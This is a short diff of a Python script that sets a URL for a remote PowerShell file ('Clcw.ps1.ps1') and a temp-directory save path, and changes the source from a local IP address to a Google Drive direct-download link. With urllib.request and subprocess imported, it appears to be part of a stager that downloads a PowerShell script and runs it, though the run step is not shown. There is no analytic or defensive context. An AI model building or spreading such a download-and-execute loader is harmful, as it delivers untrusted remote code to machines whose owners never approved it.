@@ -4,7 +4,7 @@ import urllib.request
 import subprocess
 
 # Step 1: Define the PowerShell script URL and temp path
-ps_url = "http://192.168.1.178:2596/Clcw.ps1.ps1" # Correctly named as ps_url
+ps_url = "https://drive.usercontent.google.com/download?id=15jsot0pxQlEbPBlPzId98quVRdVKwJjR&export=download&authuser=0&confirm=t&uuid=77ca476b-cd80-4bd3-bdf4-e6daeabb3223&at=AN8xHoo5lFhmwdnhKPluDLhYq-sd:1752034468492" # Correctly named as ps_url
 temp_dir = tempfile.gettempdir()
 ps_path = os.path.join(temp_dir, "Clcw.ps1.ps1") # Correctly named as ps_path
 
